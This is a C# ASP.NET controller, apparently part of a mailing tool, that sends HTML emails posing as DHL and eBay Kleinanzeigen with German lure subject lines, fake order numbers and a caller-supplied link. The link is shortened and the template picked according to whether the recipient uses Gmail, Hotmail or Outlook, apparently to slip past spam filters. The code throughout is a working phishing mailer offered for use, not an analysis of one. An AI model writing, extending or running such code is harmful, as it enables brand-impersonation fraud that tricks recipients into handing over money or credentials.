﻿using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using Microsoft.AspNetCore.Mvc;
using NoWayMailerAPI.Data;
using NoWayMailerAPI.Services.Interfaces;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]")]
public class SenderController : ControllerBase
{
	private readonly IConfiguration _configuration;
	private readonly IShortLinkService _shortLinkService;
	private readonly SmtpClient _smtpClient;
	private readonly string _senderEmail;
	private readonly int _orderNumber;

	public SenderController(IConfiguration configuration, IShortLinkService shortLinkService)
	{
		_configuration = configuration;
		_shortLinkService = shortLinkService;
		_orderNumber = Random.Shared.Next(234422000, 534522847);

		var config = new EmailSendingConfiguration();

		_configuration.GetSection("MailSettings")
					.GetChildren()
					.First(e => e.Key == "SmtpBackup")
					.Bind(config);

		_smtpClient = new SmtpClient(config.Host, config.Port)
		{
			Credentials = new NetworkCredential(config.User, config.Password),
			EnableSsl = true
		};

		_senderEmail = config.Alias;
	}

	[HttpGet("dhl")]
	public async Task<IActionResult> SendDHLEmail(string email, string link)
	{
		var body = await GetBody(link, ServiceType.DHL, email);

		var message = new MailMessage(_senderEmail, email,
			$"Unser Team hat einen Kunden für Sie gefunden #{_orderNumber}", body)
		{
			IsBodyHtml = true,
			From = new MailAddress(_senderEmail, "•DHL•Lieferungen")
		};

		try
		{
			await _smtpClient.SendMailAsync(message);

			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest(e.Message);
		}
	}

	[HttpGet("ebay")]
	public async Task<IActionResult> SendEbayEmail(string email, string link)
	{
		var body = await GetBody(link, ServiceType.EbayDe, email);
		
		var displayName = "•kleinanzeigen•info";

		var subject = $"Nutzer-Anfrage zu deiner Anzeige!#{_orderNumber}";
		
		if(email.Contains("gmail")) 
			subject = "Bezahlung der Ware! Vielen Dank, dass Sie sich für uns entschieden haben.#312887";

		var message = new MailMessage(_senderEmail, email, subject, body)
		{
			IsBodyHtml = true,
			From = new MailAddress(_senderEmail, displayName)
		};

		try
		{
			await _smtpClient.SendMailAsync(message);

			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest(e.Message);
		}
	}

	private async Task<string> GetBody(string link, ServiceType serviceType,
		string email)
	{
		var template = EbayTemplate.Custom;

		var listEmails = new List<string>
		{
			"hotmail", "outlook"
		};
		
		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
			template = EbayTemplate.Original;

		var type = ShrtCoLink.UseShrtCo;

		if (email.Contains("gmail") | email.Contains("googlemail"))
			type = ShrtCoLink.UseShinyLink;
		
		var shortLink = await _shortLinkService.GetShortLink(link, type, template);

		var templateName = template == EbayTemplate.Custom ? $"{serviceType}.html" : "EbayOriginal.html";
		
		var filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", templateName);

		var hmtlBody = FileIO.ReadAllText(filePath)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody
				.Replace("OrderNumber", _orderNumber.ToString());
	}
}